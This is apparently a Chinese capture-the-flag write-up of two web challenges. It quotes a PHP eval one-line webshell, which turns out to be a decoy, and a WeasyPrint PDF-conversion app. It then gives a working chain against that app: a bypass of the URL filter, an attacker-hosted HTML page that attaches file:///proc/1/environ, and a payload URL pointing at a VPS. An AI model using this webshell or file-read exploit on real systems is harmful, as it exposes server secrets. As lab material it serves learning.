## 真亦假，假亦真

打开shell.php，发现是一句话，但是连不上

```php
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);

//标准一句话木马~
eval($_POST[1]);
?>
```

其实这只是Java伪造的一句话

flag路由扫一下就出来了。

## CSDN_To_PDF V1.2

python WeasyPrint 的漏洞

WeasyPrint 是一个开源的 Python 库，主要用于将 HTML 内容及其相关的 CSS 样式转换成 PDF 文档。

```python
from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for
import re
from flask_weasyprint import HTML, render_pdf
import os

app = Flask(__name__)

URL_REGEX = re.compile(
    r'http(s)?://'
    r'(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
)


def is_valid_url(url):
    if not URL_REGEX.match(url):
        return False
    if "blog.csdn.net" not in url:
        return False

    return True


@app.route('/', methods=['GET', 'POST'])
def CsdnToPdf():
    if request.method == 'POST':
        url = request.form.get('url')
        url = url.replace("html", "")
        if is_valid_url(url):
            try:
                html = HTML(url=url)
                pdf = html.write_pdf()
                response = make_response(pdf)
                response.headers['Content-Type'] = 'application/pdf'
                response.headers['Content-Disposition'] = 'attachment; filename=output.pdf'

                return response
            except Exception as e:
                return f'Error generating PDF', 500
        else:
            return f'Invalid URL! Target web address: ' + url
    else:
        return render_template("index.html"), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

> 必须包含`blog.csdn.net`
>
> 会过滤替换字符串html
>
> 文件夹名字可以是`blog.csdn.net`

在vps上写个`test.html`

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
<link rel="attachment" href="file:///proc/1/environ">
</body>
</html>
```

payload

```
http://120.46.41.173/Jay17/blog.csdn.net/link.hthtmlml
```

拿到PDF后，`binwalk -e 文件名`

![image-20240405153709723](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240405153709723.png)